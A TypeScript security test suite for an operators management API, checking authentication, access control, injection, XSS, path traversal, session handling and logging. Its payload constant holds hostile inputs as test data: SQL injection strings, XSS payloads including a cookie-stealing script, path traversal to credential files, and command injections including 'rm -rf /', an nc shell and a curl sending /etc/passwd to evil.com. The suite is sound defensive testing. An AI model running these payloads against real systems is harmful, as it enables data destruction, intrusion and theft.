// =====================================================
// SECURITY TEST SUITE
// Comprehensive security testing for operators management system
// =====================================================

import { test, expect } from '@playwright/test';
import axios, { AxiosResponse } from 'axios';
import { setupTestDatabase, cleanupTestDatabase, createTestUser, createTestOperator } from '../helpers/testDatabase';

// Security test configuration
const SECURITY_CONFIG = {
  baseURL: process.env.TEST_API_URL || 'http://localhost:4000',
  adminCredentials: {
    email: 'security-admin@xpressops.com',
    password: 'SecureAdmin123!'
  },
  testUser: {
    email: 'security-user@xpressops.com',
    password: 'TestUser123!'
  }
};

// Common security test payloads
const SECURITY_PAYLOADS = {
  sqlInjection: [
    "'; DROP TABLE operators; --",
    "1' OR '1'='1",
    "1' UNION SELECT * FROM users--",
    "'; INSERT INTO operators VALUES ('evil', 'hack'); --",
    "admin'/*",
    "admin' --",
    "admin' #",
    "admin'||'",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*"
  ],
  xssPayloads: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<<SCRIPT>alert('XSS')<</SCRIPT>",
    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<script>document.cookie='stolen='+document.cookie</script>"
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../../../proc/self/environ",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
  ],
  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "&& rm -rf /",
    "; cat /etc/shadow",
    "`whoami`",
    "$(cat /etc/passwd)",
    "; nc -l -p 12345 -e /bin/bash",
    "| curl http://evil.com/steal?data=$(cat /etc/passwd)"
  ]
};

describe('Operators Management Security Tests', () => {
  
  let adminToken: string;
  let userToken: string;
  let testOperatorId: string;

  // =====================================================
  // TEST SETUP
  // =====================================================

  test.beforeAll(async () => {
    await setupTestDatabase();
    
    // Create admin user with full permissions
    const adminUser = await createTestUser({
      email: SECURITY_CONFIG.adminCredentials.email,
      password: SECURITY_CONFIG.adminCredentials.password,
      permissions: [
        'manage_operators', 'view_operators', 'create_operator',
        'delete_operator', 'manage_system', 'admin_access'
      ],
      role: 'admin',
      allowedRegions: ['ncr-001', 'region-4a', 'region-7']
    });
    adminToken = adminUser.authToken;
    
    // Create regular user with limited permissions
    const regularUser = await createTestUser({
      email: SECURITY_CONFIG.testUser.email,
      password: SECURITY_CONFIG.testUser.password,
      permissions: ['view_operators'],
      role: 'user',
      allowedRegions: ['ncr-001']
    });
    userToken = regularUser.authToken;
    
    // Create test operator
    const testOperator = await createTestOperator({
      operator_code: 'SEC-TEST-001',
      business_name: 'Security Test Operator',
      operator_type: 'tnvs',
      primary_region_id: 'ncr-001'
    });
    testOperatorId = testOperator.id;
  });

  test.afterAll(async () => {
    await cleanupTestDatabase();
  });

  // =====================================================
  // AUTHENTICATION SECURITY TESTS
  // =====================================================

  test.describe('Authentication Security', () => {
    
    test('Should reject access without authentication token', async () => {
      const response = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/operators`,
        { validateStatus: () => true }
      );
      
      expect(response.status).toBe(401);
      expect(response.data.code).toBe('UNAUTHORIZED');
    });

    test('Should reject invalid authentication tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        'Bearer ',
        '',
        null,
        undefined
      ];
      
      for (const token of invalidTokens) {
        const headers = token ? { Authorization: token } : {};
        
        const response = await axios.get(
          `${SECURITY_CONFIG.baseURL}/api/operators`,
          { 
            headers,
            validateStatus: () => true 
          }
        );
        
        expect(response.status).toBe(401);
      }
    });

    test('Should reject expired tokens', async () => {
      // Create an expired token (this would be mocked in real implementation)
      const expiredToken = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.4Adcj3UFYzPUVaVF43FmMab6RlaQD8A9V8wFzzht-KQ';
      
      const response = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/operators`,
        {
          headers: { Authorization: expiredToken },
          validateStatus: () => true
        }
      );
      
      expect([401, 403]).toContain(response.status);
    });

    test('Should enforce rate limiting on login attempts', async () => {
      const loginAttempts = [];
      
      // Make rapid login attempts with wrong credentials
      for (let i = 0; i < 20; i++) {
        const attempt = axios.post(
          `${SECURITY_CONFIG.baseURL}/api/auth/login`,
          {
            email: 'attacker@evil.com',
            password: 'wrongpassword'
          },
          { validateStatus: () => true }
        );
        
        loginAttempts.push(attempt);
      }
      
      const responses = await Promise.all(loginAttempts);
      
      // Should see rate limiting kick in (429 status codes)
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

  });

  // =====================================================
  // AUTHORIZATION SECURITY TESTS
  // =====================================================

  test.describe('Authorization Security', () => {
    
    test('Should enforce role-based access control', async () => {
      // Regular user tries to create operator (should fail)
      const operatorData = {
        operator_code: 'UNAUTHORIZED-001',
        business_name: 'Unauthorized Operator',
        legal_name: 'Unauthorized Operator Corp',
        operator_type: 'tnvs',
        primary_contact: {
          name: 'Unauthorized Contact',
          phone: '+639123456789',
          email: 'unauthorized@test.com',
          position: 'Manager'
        },
        business_address: {
          street: '1 Unauthorized Street',
          city: 'Makati',
          province: 'Metro Manila',
          region: 'NCR',
          postal_code: '1226',
          country: 'Philippines'
        },
        business_registration_number: 'DTI-UNAUTH-001',
        tin: '999-999-999-000',
        primary_region_id: 'ncr-001',
        partnership_start_date: '2024-01-01T00:00:00.000Z'
      };
      
      const response = await axios.post(
        `${SECURITY_CONFIG.baseURL}/api/operators`,
        operatorData,
        {
          headers: { Authorization: `Bearer ${userToken}` },
          validateStatus: () => true
        }
      );
      
      expect([401, 403]).toContain(response.status);
    });

    test('Should enforce regional access restrictions', async () => {
      // User tries to access operator in restricted region
      const restrictedOperator = await createTestOperator({
        operator_code: 'RESTRICTED-001',
        business_name: 'Restricted Region Operator',
        operator_type: 'tnvs',
        primary_region_id: 'region-7' // Not in user's allowed regions
      });
      
      const response = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/operators/${restrictedOperator.id}`,
        {
          headers: { Authorization: `Bearer ${userToken}` },
          validateStatus: () => true
        }
      );
      
      expect([401, 403, 404]).toContain(response.status);
    });

    test('Should prevent privilege escalation', async () => {
      // Try to modify user permissions through operator creation
      const maliciousData = {
        operator_code: 'PRIVILEGE-ESC-001',
        business_name: 'Privilege Escalation Test',
        legal_name: 'Privilege Escalation Test Corp',
        operator_type: 'tnvs',
        primary_contact: {
          name: 'Malicious Contact',
          phone: '+639123456789',
          email: 'malicious@test.com',
          position: 'Manager'
        },
        business_address: {
          street: '1 Malicious Street',
          city: 'Makati',
          province: 'Metro Manila',
          region: 'NCR',
          postal_code: '1226',
          country: 'Philippines'
        },
        business_registration_number: 'DTI-MAL-001',
        tin: '666-666-666-000',
        primary_region_id: 'ncr-001',
        partnership_start_date: '2024-01-01T00:00:00.000Z',
        // Malicious fields to try privilege escalation
        user_permissions: ['admin_access', 'manage_system'],
        role: 'admin',
        is_admin: true,
        created_by: 'system'
      };
      
      const response = await axios.post(
        `${SECURITY_CONFIG.baseURL}/api/operators`,
        maliciousData,
        {
          headers: { Authorization: `Bearer ${adminToken}` },
          validateStatus: () => true
        }
      );
      
      if (response.status === 201) {
        // Even if creation succeeds, malicious fields should be ignored
        expect(response.data.data.operator.user_permissions).toBeUndefined();
        expect(response.data.data.operator.role).toBeUndefined();
        expect(response.data.data.operator.is_admin).toBeUndefined();
      }
    });

  });

  // =====================================================
  // SQL INJECTION TESTS
  // =====================================================

  test.describe('SQL Injection Protection', () => {
    
    test('Should prevent SQL injection in operator creation', async () => {
      for (const payload of SECURITY_PAYLOADS.sqlInjection) {
        const maliciousOperatorData = {
          operator_code: payload,
          business_name: payload,
          legal_name: `Safe Name ${Math.random()}`,
          operator_type: 'tnvs',
          primary_contact: {
            name: payload,
            phone: '+639123456789',
            email: `safe${Math.random()}@test.com`,
            position: 'Manager'
          },
          business_address: {
            street: payload,
            city: 'Makati',
            province: 'Metro Manila',
            region: 'NCR',
            postal_code: '1226',
            country: 'Philippines'
          },
          business_registration_number: payload,
          tin: '123-456-789-000',
          primary_region_id: 'ncr-001',
          partnership_start_date: '2024-01-01T00:00:00.000Z'
        };
        
        const response = await axios.post(
          `${SECURITY_CONFIG.baseURL}/api/operators`,
          maliciousOperatorData,
          {
            headers: { Authorization: `Bearer ${adminToken}` },
            validateStatus: () => true
          }
        );
        
        // Should either reject the request or safely handle the input
        if (response.status === 201) {
          // If created, verify no SQL injection occurred
          expect(response.data.data.operator.operator_code).toBe(payload);
          
          // Clean up
          await axios.delete(
            `${SECURITY_CONFIG.baseURL}/api/operators/${response.data.data.operator.id}`,
            { headers: { Authorization: `Bearer ${adminToken}` } }
          );
        } else {
          // Rejection is also acceptable
          expect([400, 422]).toContain(response.status);
        }
      }
    });

    test('Should prevent SQL injection in search queries', async () => {
      for (const payload of SECURITY_PAYLOADS.sqlInjection) {
        const response = await axios.get(
          `${SECURITY_CONFIG.baseURL}/api/operators`,
          {
            params: { search: payload },
            headers: { Authorization: `Bearer ${adminToken}` },
            validateStatus: () => true
          }
        );
        
        // Should safely handle the search parameter
        expect([200, 400]).toContain(response.status);
        
        if (response.status === 200) {
          // Response should be well-formed
          expect(response.data.data.operators).toBeDefined();
          expect(Array.isArray(response.data.data.operators)).toBe(true);
        }
      }
    });

    test('Should prevent SQL injection in operator ID parameters', async () => {
      for (const payload of SECURITY_PAYLOADS.sqlInjection) {
        const response = await axios.get(
          `${SECURITY_CONFIG.baseURL}/api/operators/${encodeURIComponent(payload)}`,
          {
            headers: { Authorization: `Bearer ${adminToken}` },
            validateStatus: () => true
          }
        );
        
        // Should safely reject invalid IDs
        expect([400, 404]).toContain(response.status);
      }
    });

  });

  // =====================================================
  // CROSS-SITE SCRIPTING (XSS) TESTS
  // =====================================================

  test.describe('XSS Protection', () => {
    
    test('Should sanitize XSS payloads in operator data', async () => {
      for (const payload of SECURITY_PAYLOADS.xssPayloads) {
        const operatorData = {
          operator_code: `XSS-TEST-${Math.random().toString(36).substr(2, 9)}`,
          business_name: payload,
          legal_name: `Safe Legal Name ${Math.random()}`,
          operator_type: 'tnvs',
          primary_contact: {
            name: payload,
            phone: '+639123456789',
            email: `safe${Math.random()}@test.com`,
            position: payload
          },
          business_address: {
            street: payload,
            city: payload,
            province: 'Metro Manila',
            region: 'NCR',
            postal_code: '1226',
            country: 'Philippines'
          },
          business_registration_number: `DTI-XSS-${Math.random()}`,
          tin: '123-456-789-000',
          primary_region_id: 'ncr-001',
          partnership_start_date: '2024-01-01T00:00:00.000Z'
        };
        
        const response = await axios.post(
          `${SECURITY_CONFIG.baseURL}/api/operators`,
          operatorData,
          {
            headers: { Authorization: `Bearer ${adminToken}` },
            validateStatus: () => true
          }
        );
        
        if (response.status === 201) {
          const createdOperator = response.data.data.operator;
          
          // Verify XSS payload is sanitized
          expect(createdOperator.business_name).not.toContain('<script>');
          expect(createdOperator.business_name).not.toContain('javascript:');
          expect(createdOperator.primary_contact.name).not.toContain('<script>');
          expect(createdOperator.primary_contact.position).not.toContain('<script>');
          
          // Clean up
          await axios.delete(
            `${SECURITY_CONFIG.baseURL}/api/operators/${createdOperator.id}`,
            { headers: { Authorization: `Bearer ${adminToken}` } }
          );
        }
      }
    });

    test('Should sanitize XSS in API responses', async () => {
      // Create operator with potentially dangerous content
      const xssOperator = await createTestOperator({
        operator_code: 'XSS-RESPONSE-001',
        business_name: '<script>alert("XSS")</script>Test Operator',
        operator_type: 'tnvs',
        primary_region_id: 'ncr-001'
      });
      
      const response = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/operators/${xssOperator.id}`,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      const operator = response.data.data.operator;
      
      // Verify response is sanitized
      expect(operator.business_name).not.toContain('<script>');
      expect(typeof operator.business_name).toBe('string');
      
      // Verify content-type is properly set
      expect(response.headers['content-type']).toContain('application/json');
    });

  });

  // =====================================================
  // PATH TRAVERSAL TESTS
  // =====================================================

  test.describe('Path Traversal Protection', () => {
    
    test('Should prevent path traversal in file operations', async () => {
      for (const payload of SECURITY_PAYLOADS.pathTraversal) {
        const response = await axios.get(
          `${SECURITY_CONFIG.baseURL}/api/operators/export`,
          {
            params: { filename: payload },
            headers: { Authorization: `Bearer ${adminToken}` },
            validateStatus: () => true
          }
        );
        
        // Should safely reject path traversal attempts
        expect([400, 404, 403]).toContain(response.status);
      }
    });

    test('Should prevent directory traversal in API endpoints', async () => {
      const traversalPaths = [
        '../../../api/admin/users',
        '..%2F..%2F..%2Fapi%2Fadmin%2Fusers',
        '....//....//api//admin//users'
      ];
      
      for (const path of traversalPaths) {
        const response = await axios.get(
          `${SECURITY_CONFIG.baseURL}/api/operators/${path}`,
          {
            headers: { Authorization: `Bearer ${adminToken}` },
            validateStatus: () => true
          }
        );
        
        // Should not allow traversal to other endpoints
        expect([400, 404]).toContain(response.status);
      }
    });

  });

  // =====================================================
  // COMMAND INJECTION TESTS
  // =====================================================

  test.describe('Command Injection Protection', () => {
    
    test('Should prevent command injection in operator data', async () => {
      for (const payload of SECURITY_PAYLOADS.commandInjection) {
        const operatorData = {
          operator_code: `CMD-INJ-${Math.random().toString(36).substr(2, 9)}`,
          business_name: payload,
          legal_name: `Safe Legal Name ${Math.random()}`,
          operator_type: 'tnvs',
          primary_contact: {
            name: payload,
            phone: '+639123456789',
            email: `safe${Math.random()}@test.com`,
            position: 'Manager'
          },
          business_address: {
            street: payload,
            city: 'Makati',
            province: 'Metro Manila',
            region: 'NCR',
            postal_code: '1226',
            country: 'Philippines'
          },
          business_registration_number: payload,
          tin: '123-456-789-000',
          primary_region_id: 'ncr-001',
          partnership_start_date: '2024-01-01T00:00:00.000Z'
        };
        
        const response = await axios.post(
          `${SECURITY_CONFIG.baseURL}/api/operators`,
          operatorData,
          {
            headers: { Authorization: `Bearer ${adminToken}` },
            validateStatus: () => true
          }
        );
        
        // Should either safely create or reject
        if (response.status === 201) {
          // Clean up
          await axios.delete(
            `${SECURITY_CONFIG.baseURL}/api/operators/${response.data.data.operator.id}`,
            { headers: { Authorization: `Bearer ${adminToken}` } }
          );
        } else {
          expect([400, 422]).toContain(response.status);
        }
      }
    });

  });

  // =====================================================
  // SENSITIVE DATA EXPOSURE TESTS
  // =====================================================

  test.describe('Sensitive Data Protection', () => {
    
    test('Should not expose sensitive information in API responses', async () => {
      const response = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/operators/${testOperatorId}`,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      const operator = response.data.data.operator;
      
      // Check that sensitive data is not exposed
      expect(operator.internal_notes).toBeUndefined();
      expect(operator.created_by_password).toBeUndefined();
      expect(operator.database_id).toBeUndefined();
      expect(operator.secret_keys).toBeUndefined();
      
      // Check that TIN might be partially masked
      if (operator.tin) {
        expect(typeof operator.tin).toBe('string');
      }
    });

    test('Should mask or hide financial details for unauthorized users', async () => {
      const response = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/operators/${testOperatorId}`,
        { headers: { Authorization: `Bearer ${userToken}` } }
      );
      
      if (response.status === 200) {
        const operator = response.data.data.operator;
        
        // Financial details should be hidden or masked for regular users
        expect(operator.wallet_balance).toBeUndefined();
        expect(operator.total_commissions_earned).toBeUndefined();
        expect(operator.bank_account_details).toBeUndefined();
      }
    });

    test('Should not expose system configuration in error messages', async () => {
      // Try to trigger an error that might expose system info
      const response = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/operators/00000000-0000-0000-0000-000000000000`,
        {
          headers: { Authorization: `Bearer ${adminToken}` },
          validateStatus: () => true
        }
      );
      
      expect(response.status).toBe(404);
      
      // Error message should not expose database details, file paths, etc.
      const errorMessage = JSON.stringify(response.data).toLowerCase();
      expect(errorMessage).not.toContain('database');
      expect(errorMessage).not.toContain('sql');
      expect(errorMessage).not.toContain('postgres');
      expect(errorMessage).not.toContain('/var/');
      expect(errorMessage).not.toContain('c:\\');
      expect(errorMessage).not.toContain('stack trace');
    });

  });

  // =====================================================
  // INPUT VALIDATION TESTS
  // =====================================================

  test.describe('Input Validation Security', () => {
    
    test('Should validate email format strictly', async () => {
      const invalidEmails = [
        'invalid-email',
        'test@',
        '@invalid.com',
        'test..test@invalid.com',
        'test@invalid',
        'test@.invalid.com',
        '<script>alert("xss")</script>@invalid.com',
        'test@inv\x00alid.com'
      ];
      
      for (const email of invalidEmails) {
        const operatorData = {
          operator_code: `EMAIL-${Math.random().toString(36).substr(2, 9)}`,
          business_name: 'Email Validation Test',
          legal_name: 'Email Validation Test Corp',
          operator_type: 'tnvs',
          primary_contact: {
            name: 'Test Contact',
            phone: '+639123456789',
            email: email,
            position: 'Manager'
          },
          business_address: {
            street: '1 Test Street',
            city: 'Makati',
            province: 'Metro Manila',
            region: 'NCR',
            postal_code: '1226',
            country: 'Philippines'
          },
          business_registration_number: 'DTI-EMAIL-TEST-001',
          tin: '123-456-789-000',
          primary_region_id: 'ncr-001',
          partnership_start_date: '2024-01-01T00:00:00.000Z'
        };
        
        const response = await axios.post(
          `${SECURITY_CONFIG.baseURL}/api/operators`,
          operatorData,
          {
            headers: { Authorization: `Bearer ${adminToken}` },
            validateStatus: () => true
          }
        );
        
        expect(response.status).toBe(400);
        expect(response.data.errors).toBeDefined();
      }
    });

    test('Should validate phone number format for Philippine numbers', async () => {
      const invalidPhones = [
        'invalid-phone',
        '123456789',
        '++639123456789',
        '639123456789123456',
        '123',
        '',
        null,
        '<script>alert("xss")</script>',
        '09123456789123456789' // Too long
      ];
      
      for (const phone of invalidPhones) {
        const operatorData = {
          operator_code: `PHONE-${Math.random().toString(36).substr(2, 9)}`,
          business_name: 'Phone Validation Test',
          legal_name: 'Phone Validation Test Corp',
          operator_type: 'tnvs',
          primary_contact: {
            name: 'Test Contact',
            phone: phone,
            email: `test${Math.random()}@test.com`,
            position: 'Manager'
          },
          business_address: {
            street: '1 Test Street',
            city: 'Makati',
            province: 'Metro Manila',
            region: 'NCR',
            postal_code: '1226',
            country: 'Philippines'
          },
          business_registration_number: 'DTI-PHONE-TEST-001',
          tin: '123-456-789-000',
          primary_region_id: 'ncr-001',
          partnership_start_date: '2024-01-01T00:00:00.000Z'
        };
        
        const response = await axios.post(
          `${SECURITY_CONFIG.baseURL}/api/operators`,
          operatorData,
          {
            headers: { Authorization: `Bearer ${adminToken}` },
            validateStatus: () => true
          }
        );
        
        expect(response.status).toBe(400);
      }
    });

    test('Should enforce maximum field lengths', async () => {
      const longString = 'A'.repeat(10000); // Very long string
      
      const operatorData = {
        operator_code: longString,
        business_name: longString,
        legal_name: longString,
        operator_type: 'tnvs',
        primary_contact: {
          name: longString,
          phone: '+639123456789',
          email: 'test@test.com',
          position: longString
        },
        business_address: {
          street: longString,
          city: longString,
          province: 'Metro Manila',
          region: 'NCR',
          postal_code: '1226',
          country: 'Philippines'
        },
        business_registration_number: longString,
        tin: '123-456-789-000',
        primary_region_id: 'ncr-001',
        partnership_start_date: '2024-01-01T00:00:00.000Z'
      };
      
      const response = await axios.post(
        `${SECURITY_CONFIG.baseURL}/api/operators`,
        operatorData,
        {
          headers: { Authorization: `Bearer ${adminToken}` },
          validateStatus: () => true
        }
      );
      
      expect(response.status).toBe(400);
      expect(response.data.errors).toBeDefined();
    });

  });

  // =====================================================
  // SESSION SECURITY TESTS
  // =====================================================

  test.describe('Session Security', () => {
    
    test('Should invalidate tokens after user logout', async () => {
      // First, verify token works
      const response1 = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/operators`,
        { headers: { Authorization: `Bearer ${userToken}` } }
      );
      expect(response1.status).toBe(200);
      
      // Logout
      await axios.post(
        `${SECURITY_CONFIG.baseURL}/api/auth/logout`,
        {},
        { headers: { Authorization: `Bearer ${userToken}` } }
      );
      
      // Token should now be invalid
      const response2 = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/operators`,
        {
          headers: { Authorization: `Bearer ${userToken}` },
          validateStatus: () => true
        }
      );
      expect(response2.status).toBe(401);
    });

    test('Should enforce token timeout', async () => {
      // This test would typically involve mocking time or waiting
      // For now, we'll test that the token has proper expiration claims
      const tokenParts = userToken.split('.');
      if (tokenParts.length === 3) {
        const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
        expect(payload.exp).toBeDefined();
        expect(payload.iat).toBeDefined();
        expect(payload.exp).toBeGreaterThan(payload.iat);
      }
    });

  });

  // =====================================================
  // BUSINESS LOGIC SECURITY TESTS
  // =====================================================

  test.describe('Business Logic Security', () => {
    
    test('Should prevent commission manipulation', async () => {
      // Try to manipulate commission calculation through malicious input
      const maliciousCommissionData = {
        operatorId: testOperatorId,
        bookingId: 'MALICIOUS-001',
        baseFare: -1000.00, // Negative fare to try to create negative commission
        commissionOverride: 999999.99,
        tier: 'tier_3',
        multiplier: 1000
      };
      
      const response = await axios.post(
        `${SECURITY_CONFIG.baseURL}/api/test/simulate-commission`,
        maliciousCommissionData,
        {
          headers: { Authorization: `Bearer ${adminToken}` },
          validateStatus: () => true
        }
      );
      
      if (response.status === 200) {
        // Commission should be calculated properly despite malicious input
        const commission = response.data.data.commission_amount;
        expect(commission).toBeGreaterThanOrEqual(0);
        expect(commission).toBeLessThan(1000); // Reasonable upper limit
      } else {
        // Or the request should be rejected
        expect([400, 422]).toContain(response.status);
      }
    });

    test('Should prevent performance score manipulation', async () => {
      const maliciousPerformanceData = {
        operatorId: testOperatorId,
        performanceMetrics: {
          daily_vehicle_utilization: 999.99, // Invalid - over 100%
          peak_hour_availability: -50, // Invalid - negative
          safety_incident_rate: -999, // Invalid - should be positive rate
          customer_satisfaction: 100, // Invalid - over 5.0
          score_override: 100,
          admin_boost: 50,
          hidden_multiplier: 10
        }
      };
      
      const response = await axios.post(
        `${SECURITY_CONFIG.baseURL}/api/test/simulate-performance-data`,
        maliciousPerformanceData,
        {
          headers: { Authorization: `Bearer ${adminToken}` },
          validateStatus: () => true
        }
      );
      
      // Should reject invalid performance data
      expect([400, 422]).toContain(response.status);
    });

    test('Should prevent vehicle limit bypass', async () => {
      // Create TNVS operator at vehicle limit
      const operatorAtLimit = await createTestOperator({
        operator_code: 'LIMIT-TEST-001',
        business_name: 'Limit Test Operator',
        operator_type: 'tnvs',
        primary_region_id: 'ncr-001',
        current_vehicle_count: 3, // At TNVS limit
        max_vehicles: 3
      });
      
      // Try to add a 4th vehicle
      const vehicleData = {
        plate_number: 'LIMIT-001',
        make: 'Toyota',
        model: 'Vios',
        year: 2023,
        color: 'White',
        service_type: 'TNVS',
        // Malicious attempt to bypass limit
        force_add: true,
        admin_override: true,
        ignore_limits: true
      };
      
      const response = await axios.post(
        `${SECURITY_CONFIG.baseURL}/api/operators/${operatorAtLimit.id}/vehicles`,
        vehicleData,
        {
          headers: { Authorization: `Bearer ${adminToken}` },
          validateStatus: () => true
        }
      );
      
      // Should enforce vehicle limit regardless of malicious fields
      expect(response.status).toBe(400);
      expect(response.data.code).toBe('VEHICLE_LIMIT_EXCEEDED');
    });

  });

  // =====================================================
  // AUDIT AND LOGGING TESTS
  // =====================================================

  test.describe('Security Audit and Logging', () => {
    
    test('Should log security events', async () => {
      // Attempt unauthorized access
      await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/admin/users`,
        {
          headers: { Authorization: `Bearer ${userToken}` },
          validateStatus: () => true
        }
      );
      
      // Check audit logs (this would typically check a logging endpoint)
      const auditResponse = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/admin/audit-logs`,
        {
          params: { type: 'security', limit: 10 },
          headers: { Authorization: `Bearer ${adminToken}` },
          validateStatus: () => true
        }
      );
      
      if (auditResponse.status === 200) {
        const logs = auditResponse.data.data.logs;
        expect(Array.isArray(logs)).toBe(true);
        
        // Should contain security-related events
        const securityEvents = logs.filter((log: any) => 
          log.event_type === 'unauthorized_access' || 
          log.event_type === 'permission_denied'
        );
        
        expect(securityEvents.length).toBeGreaterThan(0);
      }
    });

    test('Should track failed login attempts', async () => {
      // Make failed login attempts
      for (let i = 0; i < 3; i++) {
        await axios.post(
          `${SECURITY_CONFIG.baseURL}/api/auth/login`,
          {
            email: 'nonexistent@test.com',
            password: 'wrongpassword'
          },
          { validateStatus: () => true }
        );
      }
      
      // Check failed login tracking
      const response = await axios.get(
        `${SECURITY_CONFIG.baseURL}/api/admin/security-events`,
        {
          params: { type: 'failed_login', email: 'nonexistent@test.com' },
          headers: { Authorization: `Bearer ${adminToken}` },
          validateStatus: () => true
        }
      );
      
      if (response.status === 200) {
        const events = response.data.data.events;
        expect(events.length).toBeGreaterThanOrEqual(3);
      }
    });

  });

});